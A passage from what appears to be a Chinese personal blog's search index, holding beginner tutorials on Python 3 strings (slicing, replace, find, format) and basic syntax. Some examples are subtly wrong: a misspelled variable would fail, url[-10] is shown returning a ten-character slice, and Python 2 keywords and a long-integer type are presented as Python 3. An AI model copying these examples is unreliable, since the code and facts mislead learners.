号字符</span><span class="token keyword">print</span> <span class="token punctuation">(</span>name<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 第 -4 号字符，也就是倒数第 4 个字符</span><span class="token keyword">print</span> <span class="token punctuation">(</span>name<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 从第 11 号到第 14 位，第 14 号被排除在外</span><span class="token keyword">print</span> <span class="token punctuation">(</span>name<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 从第 11 号到第 15 位，第 15 号被排除在外</span><span class="token keyword">print</span> <span class="token punctuation">(</span>name<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 从第 5 号到结束</span><span class="token keyword">print</span> <span class="token punctuation">(</span>name<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 从第 0 号到第 5 号</span><span class="token comment"># 输出结果</span>MBBozBozime <span class="token keyword">is</span> BoziMy na<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="center">name = “</th><th align="center">M</th><th align="center">y</th><th align="center"></th><th align="center">n</th><th align="center">a</th><th align="center">m</th><th align="center">e</th><th align="center"></th><th align="center">i</th><th align="center">s</th><th align="center"></th><th align="center">B</th><th align="center">o</th><th align="center">z</th><th align="center">i</th><th align="center">“</th></tr></thead><tbody><tr><td align="center">indexing</td><td align="center">0<br>-15</td><td align="center">1<br>-14</td><td align="center">2<br>-13</td><td align="center">3<br>-12</td><td align="center">4<br>-11</td><td align="center">5<br>-10</td><td align="center">6<br>-9</td><td align="center">7<br>-8</td><td align="center">8<br>-7</td><td align="center">9<br>-6</td><td align="center">10<br>-5</td><td align="center">11<br>-4</td><td align="center">12<br>-3</td><td align="center">13<br>-2</td><td align="center">14<br>-1</td><td align="center"></td></tr></tbody></table><h3 id="Java-中的字符串截取-substring"><a href="#Java-中的字符串截取-substring" class="headerlink" title="Java 中的字符串截取 substring()"></a>Java 中的字符串截取 substring()</h3><blockquote><p>没学过 Java 直接跳过</p></blockquote><p>顺便复习一下 Java API，哈哈哈</p><ul><li><p>public String substring(int beginIndex)</p><p>  返回一个字符串，它是字符串的子字符串。子字符串以指定索引中的字符开始，并扩展到该字符串的末尾:</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> result <span class="token operator">=</span> <span class="token string">"abcdefg"</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出结果</span>defg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>public String substring(int beginIndex, int endIndex)</p><p>  返回一个新字符串，它是字符串的子字符串。子字符串从指定的开始索引开始，并扩展到索引 <code>endIndex - 1</code> 的字符。因此，子字符串的长度为 <code>endindex - beginindex</code>。</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> result <span class="token operator">=</span> <span class="token string">"abcdefg"</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出结果</span>de<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h3><p>在此之前，我们先做个文字小游戏——「<font color="d63e63">找出你朋友中的魔鬼</font>」：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">word <span class="token operator">=</span> <span class="token string">'friends'</span>find_the_evil_in_your_friends <span class="token operator">=</span> word<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> word<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> word<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token punctuation">(</span>find_the_evil_in_your_friends<span class="token punctuation">)</span><span class="token comment"># 输出结果</span>fiend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>怎么样？你找到了吗？</p><p>下面看一个是项目中的应用：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">'http://ww1.site.cn/14d2e8ejw1exjogbxdxhj20ci0kuwex.jpg'</span><span class="token string">'http://ww1.site.cn/85cc87jw1ex23yhwws5j20jg0szmzk.png'</span><span class="token string">'http://ww2.site.cn/185cc87jw1ex23ynr1naj20jg0t60wv.jpg'</span><span class="token string">'http://ww3.site.cn/185cc87jw1ex23yyvq29j20jg0t6gp4.gif'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>假如现在有 500 多张附有这样链接的图片要下载，也就是说我需要给这 500 张不同格式的图片（png,jpg,gif）以一个统一的方式进行命名。</p><p>通过观察规律，决定以链接尾部倒数 10 个字符进行命名，于是可以输入代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">url <span class="token operator">=</span> <span class="token string">'http://ww1.site.cn/14d2e8ejw1exjogbxdxhj20ci0kuwex.jpg'</span>file_name <span class="token operator">=</span> url<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token comment"># 输出结果</span>0kuwex<span class="token punctuation">.</span>jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="字符串的常用方法"><a href="#字符串的常用方法" class="headerlink" title="字符串的常用方法"></a>字符串的常用方法</h2><p>Python 是面向对象进行编程的语言，而对象拥有各种功能、特性，专业术语称之为——方法（Method）。</p><p>假如我们生活中的车是「对象」，即 car。</p><p>而车有很多功能，例如「开」就是一个重要功能，于是对于『汽车使用「开」这个功能』，在 Python 中就可以表述成这样：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">car<span class="token punctuation">.</span>drive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/" alt="车的属性和方法"></p><blockquote><p>这里与 Java 面向对象差不多</p></blockquote><h3 id="替换字符串"><a href="#替换字符串" class="headerlink" title="替换字符串"></a>替换字符串</h3><p>了解了对象的方法后，我们来看这样一个场景：</p><blockquote><p>很多时候我们在网站上查看个人信息的时候，银行账户、身份证和手机号等都会显示部分信息，其余的用「*」来代替。</p></blockquote><p><img src="/" alt="替换字符串"></p><p>下面我们试着用 Python 字符串的方法来实现这一个功能:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">number <span class="token operator">=</span> <span class="token string">'1386-666-0006'</span>hiding_nomber <span class="token operator">=</span> number<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>number<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'*'</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>hiding_number<span class="token punctuation">)</span><span class="token comment"># 输出结果</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">*</span><span class="token number">0006</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中我们使用了 <code>replace()</code> 方法进行「遮挡」。会将原字符串中的某些字符串替换成新的字符串，查看 Python 3 API 文档可以看到：</p><ul><li><p>str.replace(old, new[, count])</p><ol><li>str.replace(old, new)</li><li>str.replace(old, new, count)</li></ol><p>  Return a copy of the string with all occurrences of substring old replaced by new. If the optional argument count is given, only the first count occurrences are replaced.</p></li></ul><p>翻译成中文为：将字符串中的所有子字符串 old 替换成新字符串 new 后返回，返回的字符串是原字符串的副本，并不影响原字符串。如果给出可选参数 count，则只有前 count 个出现的字字符串 old 被替换。</p><h3 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h3><p>我们再试试解决一个更复杂一点的问题，来模拟手机通讯录中的<font color="d63e63">电话号码联想功能</font></p><p><img src="/" alt="电话号码联想"></p><blockquote><p>只是个大概思路，真实情况更为复杂</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">search <span class="token operator">=</span> <span class="token string">'168'</span>num1 <span class="token operator">=</span> <span class="token string">'1368-168-0006'</span>num2 <span class="token operator">=</span> <span class="token string">'1681-222-0006'</span><span class="token keyword">print</span> <span class="token punctuation">(</span>search <span class="token operator">+</span> <span class="token string">' is at '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>search<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' to '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>search<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>search<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' of num1'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>search <span class="token operator">+</span> <span class="token string">' is at '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num2<span class="token punctuation">.</span>find<span class="token punctuation">(</span>search<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' to '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num2<span class="token punctuation">.</span>find<span class="token punctuation">(</span>search<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>search<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' of num2'</span><span class="token punctuation">)</span><span class="token comment"># 输出结果</span><span class="token number">168</span> <span class="token keyword">is</span> at <span class="token number">5</span> to <span class="token number">8</span> of num1<span class="token number">168</span> <span class="token keyword">is</span> at <span class="token number">0</span> to <span class="token number">3</span> of num2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上面的代码中，我们使用了 <code>str.find()</code> 方法，我们来看看 Python 3 的 API 文档是怎么说的：</p><ul><li><p>str.find(sub[, start[, end]])</p><ol><li>str.find(sub)</li><li>str.find(sub, start)</li><li>str.find(sub, start, end)</li></ol><p>  Return the lowest index in the string where substring sub is found within the slice s[start:end]. Optional arguments start and end are interpreted as in slice notation. Return -1 if sub is not found.</p></li></ul><p>继续秀我的烂英语(翻译不好请指出，最近在学英语，哈哈)</p><p>返回字字符串 <code>sub</code> 在 <code>str</code>（或者字符串片段 <code>str[start:end]</code>）中找到的最低索引位置(整数)。可选参数的开始和结束被解释为片表示法。如果没有在 <code>str</code> 中找到 <code>sub</code> 则返回 <code>-1</code>。</p><blockquote><p><code>find()</code> 方法仅当你需要知道 sub 在 str 中的位置时才使用，若想要检查 sub 是否为 str 的子字符串，请使用 <code>in</code> 运算符:<br>   </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">'Py'</span> <span class="token keyword">in</span> <span class="token string">'Python'</span><span class="token comment"># 输出结果</span><span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p></p></blockquote><p>这里还用到了数据类型转换 <code>str()</code> 将数字转换为字符串</p><p>以及 <code>len()</code> 方法获得字符串的长度</p><ul><li><p>len(s)</p><p>  Return the length (the number of items) of an object. The argument may be a sequence (such as a string, bytes, tuple, list, or range) or a collection (such as a dictionary, set, or frozen set).</p></li></ul><p>翻译：返回对象的长度(项目的个数)。参数可能是一个序列(例如字符串、字节、元组、列表或范围)或集合(如字典、集合或冻结集)。</p><blockquote><p>呃…·<code>len()</code> 方法好像用的地方还很多呢…貌似把 Java 的各种 <code>length</code> 属性、<code>length()</code> 方法以及 <code>size() </code>方法整合到一起啦？以后遇到再说啦！</p></blockquote><h3 id="字符串格式化符"><a href="#字符串格式化符" class="headerlink" title="字符串格式化符"></a>字符串格式化符</h3><blockquote><p>这个名字…嗯，总觉着怪怪的…</p></blockquote><p>来看个填空题</p><p>__ a word she can get what she __ for.</p><p>A.With&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;B.came</p><p>上面这样的填空题大家肯定不陌生，当字符串中有多个这样的「空」需要填写的时候，我们可以使用 <code>.format()</code> 方法进行批处理，它的基本使用方法有下面几种：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">example <span class="token operator">=</span> <span class="token string">'{} a word she can get what she {} for.'</span><span class="token keyword">print</span> <span class="token punctuation">(</span>example<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'With'</span><span class="token punctuation">,</span><span class="token string">'came'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># print ('{preposition} a word she can get what she {verb} for.'.format(preposition = 'With', verb = 'came'))</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'{1} a word she can get what she {2} for.'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'came'</span><span class="token punctuation">,</span><span class="token string">'With'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 输出结果</span>With a word she can get what she came <span class="token keyword">for</span><span class="token punctuation">.</span>With a word she can get what she came <span class="token keyword">for</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这个…第二种方式我运行的时候报错啦，有人知道什么原因吗？…</p></blockquote><p>来来来继续看 API 文档秀我的烂翻译…</p><ul><li><p>str.format(*args, **kwargs)</p><p>  Perform a string formatting operation. The string on which this method is called can contain literal text or replacement fields delimited by braces {}. Each replacement field contains either the numeric index of a positional argument, or the name of a keyword argument. Returns a copy of the string where each replacement field is replaced with the string value of the corresponding argument.</p></li></ul><p>这么长啊…硬着头皮翻译：<br>执行字符串格式化操作。调用这个方法的字符串可以包含蚊子文本或由大括号「<code>{}</code>」分隔的替换字段。每个<code>{}</code>都包含一个位置参数的数值索引，或一个关键字参数的名称。该方法返回 str 的副本(不影响原 str 值)，其中每个<code>{}</code>替换为相应参数的字符串值。</p><p>这种字符串天空的方式使用很广泛，例如向下面代码这样填充王志忠空缺的城市数据：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">city <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'write down the name of city:'</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://apistore.baidu.com/microservice/weather?citypinyin={}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>city<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>这是利用百毒提供的天气 API 实现客户端天气插件的开发代码片段</p></blockquote><h2 id="感谢看完"><a href="#感谢看完" class="headerlink" title="感谢看完"></a>感谢看完</h2><p>嗯，以上就是字符串的基本概念和常用方法啦！</p><blockquote><p>如果想更加详细的了解 Python 3 字符串的用法，可以去查看官方的 API 文档，不过初学者不建议哟，比如我…</p><p>因为直接看 API 文档的话太枯燥了，很容易失去兴趣，同样…比如我…</p></blockquote><p>最后！看完有疑问以及有建议的可以留言！！！谢谢！</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识 Python 3</title>
      <link href="/2017/11/04/hellopython3/"/>
      <url>/2017/11/04/hellopython3/</url>
      
        <content type="html"><![CDATA[<p>为了了解和学习机器学习，我将魔掌！伸向了 Python 3…<br>虽然我编程还菜的抠脚，但也算是有点编程基础了，所以就直接去了解 Python 3 语法基础啦~</p><span id="more"></span><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>Python 3 默认以 <font color="red"><strong>UTF-8</strong></font> 编码</p><p>也可以在源码中指定其他编码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>由于中文注释也会报错，所以建议在每个文件中都指明编码方式为 UTF-8</p></blockquote><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><ul><li>第一个字符必须是字母或’_’</li><li>标识符的其他部分可以是字母、数字和’_’</li><li>标识符对大小写敏感</li></ul><h2 id="保留字-amp-注释-amp-输出"><a href="#保留字-amp-注释-amp-输出" class="headerlink" title="保留字 &amp; 注释 &amp; 输出"></a>保留字 &amp; 注释 &amp; 输出</h2><ul><li>我们不能把保留字用作任何标识符名称。</li><li>单行和多行注释都用 ‘#’</li><li>print 默认输出时换行的，如果要**实现不换行需要在变量末尾加上 end=””**：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 这是注释</span><span class="token comment"># 多行注释也用 '#'</span><span class="token keyword">import</span> keyword <span class="token comment"># 这也是注释</span>a<span class="token operator">=</span><span class="token string">"以下是"</span> <span class="token comment"># 赋值</span>b<span class="token operator">=</span><span class="token string">"Python "</span> <span class="token comment"># 赋值</span>c<span class="token operator">=</span><span class="token string">"3"</span>d<span class="token operator">=</span><span class="token string">"保留字"</span><span class="token keyword">print</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment"># 换行输出</span><span class="token keyword">print</span> <span class="token punctuation">(</span>b<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token comment"># 不换行输出</span><span class="token keyword">print</span> <span class="token punctuation">(</span>c<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span> <span class="token comment"># 不换行输出</span><span class="token keyword">print</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>keyword<span class="token punctuation">.</span>kwlist<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到输出结果为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">以下是 Pyhton <span class="token number">3</span> 保留字：<span class="token punctuation">[</span><span class="token string">'and'</span><span class="token punctuation">,</span> <span class="token string">'as'</span><span class="token punctuation">,</span> <span class="token string">'assert'</span><span class="token punctuation">,</span> <span class="token string">'break'</span><span class="token punctuation">,</span> <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'continue'</span><span class="token punctuation">,</span> <span class="token string">'def'</span><span class="token punctuation">,</span> <span class="token string">'del'</span><span class="token punctuation">,</span> <span class="token string">'elif'</span><span class="token punctuation">,</span> <span class="token string">'else'</span><span class="token punctuation">,</span> <span class="token string">'except'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'finally'</span><span class="token punctuation">,</span> <span class="token string">'for'</span><span class="token punctuation">,</span> <span class="token string">'from'</span><span class="token punctuation">,</span> <span class="token string">'global'</span><span class="token punctuation">,</span> <span class="token string">'if'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'in'</span><span class="token punctuation">,</span> <span class="token string">'is'</span><span class="token punctuation">,</span> <span class="token string">'lambda'</span><span class="token punctuation">,</span> <span class="token string">'not'</span><span class="token punctuation">,</span> <span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">'pass'</span><span class="token punctuation">,</span> <span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'raise'</span><span class="token punctuation">,</span> <span class="token string">'return'</span><span class="token punctuation">,</span> <span class="token string">'try'</span><span class="token punctuation">,</span> <span class="token string">'while'</span><span class="token punctuation">,</span> <span class="token string">'with'</span><span class="token punctuation">,</span> <span class="token string">'yield'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><p>Python 3 不用显式指明变量类型，但是不同的数据类型是不能合并的：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">num <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>string <span class="token operator">=</span> <span class="token string">'2'</span><span class="token keyword">print</span> <span class="token punctuation">(</span>num <span class="token operator">+</span> string<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上面的代码运行的时候就会报错，但是可以通过一些方法进行类型转换：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">num <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>string <span class="token operator">=</span> <span class="token string">'2'</span>num2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>num <span class="token operator">+</span> num2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果你不知道变量是什么类型，可以通过 <code>type()</code> 函数 lai 查看类型</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">num <span class="token operator">=</span> <span class="token number">3</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h2><p>Python 使用「缩进」来表示代码块，不需要使用大括号<code>{}</code></p><blockquote><p>缩进的格数是可变的，但是同一个代码块的语句必须包含相同的缩进空格数</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Answer"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"True"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Answer"</span><span class="token punctuation">)</span>  <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"False"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果缩进不一致，会导致运行错误：</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">File <span class="token string">"test.py"</span><span class="token punctuation">,</span> line <span class="token number">6</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"False"</span><span class="token punctuation">)</span>                  <span class="token operator">^</span>IndentationError<span class="token punctuation">:</span> unindent does <span class="token keyword">not</span> <span class="token keyword">match</span> <span class="token builtin">any</span> outer indentation level<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h2><p>Python 通常是一行写完一条语句，但如果语句很长，我们可以使用反斜杠「<code>\</code>」来实现多行语句：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">total <span class="token operator">=</span> item_1 <span class="token operator">+</span> \        item_2 <span class="token operator">+</span> \        item_3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>而在 <code>[]</code>，<code>{}</code> 或 <code>()</code> 中的多行语句，不需要使用反斜杠「<code>\</code>」:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">total <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'item_1'</span><span class="token punctuation">,</span> <span class="token string">'item_2'</span><span class="token punctuation">,</span> <span class="token string">'item_3'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>Python 中有四种数据类型</p><ul><li>整数：如 1</li><li>长整数：比较大的整数</li><li>浮点数：如 1.23、3E-2</li><li>复数：如 1 + 2j、1.1 + 2.2j</li></ul><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><ul><li><p>Python 中单引号和双引号使用完全相同。</p></li><li><p>使用三引号「<code>'''</code>」或「<code>"""</code>」可以指定一个多行字符串</p></li><li><p>转义字符「<code>\</code>」</p></li><li><p>自然字符串：通过在字符串前加 r 或 R，所见即所得。</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">r"this is a line with \n.)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  这里将输出</p>  <pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">this is a line with \n.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  而不是</p>  <pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">this is a line with.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>Python 允许处理 unicode 字符串，加前缀 u 或 U。</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">u"this is an unicode string."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>字符串是不可改变的</p></li><li><p>按字面意义级联字符串：如 <code>"this " "is " "string"</code> 会被自动转换为 <code>this is string</code></p></li><li><p>字符串可以跟整数相乘</p></li></ul><p>示例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">word <span class="token operator">=</span> <span class="token string">'字符串'</span>paragraph <span class="token operator">=</span> <span class="token triple-quoted-string string">"""这是一个段落，可以由多行组成"""</span><span class="token keyword">print</span> <span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>paragraph<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"this "</span> <span class="token string">"is "</span> <span class="token string">"string"</span><span class="token punctuation">)</span>words <span class="token operator">=</span> <span class="token string">'word'</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token keyword">print</span> <span class="token punctuation">(</span>words<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">字符串这是一个句子。这是一个段落，this is stringwordwordword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h2><p><font color="#DD5555">也是代码的一部分</font></p><p>函数之间或类的方法之间用空行分割，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。</p><blockquote><p>空行与代码缩进不同，空行并不是 Python 语法的一部分。书写时不插入空行，Python 解释器运行也不会出错。但是空行的作用在于分隔两段不同功能或含义的代码，便于日后代码的维护与重构。</p></blockquote><h2 id="等待用户输入"><a href="#等待用户输入" class="headerlink" title="等待用户输入"></a>等待用户输入</h2><p>执行下面的程序在按回车键后会等待用户输入：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"这里写给用户看的提示"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="同一行写多条语句"><a href="#同一行写多条语句" class="headerlink" title="同一行写多条语句"></a>同一行写多条语句</h2><p>Python 可以在同一行中使用多条语句，语句之间使用分号「;」分割：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">;</span> x <span class="token operator">=</span> <span class="token string">'BoziBozi'</span><span class="token punctuation">;</span> sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行上面的代码，输出如下：</p><pre class="line-numbers language-ini" data-language="ini"><code 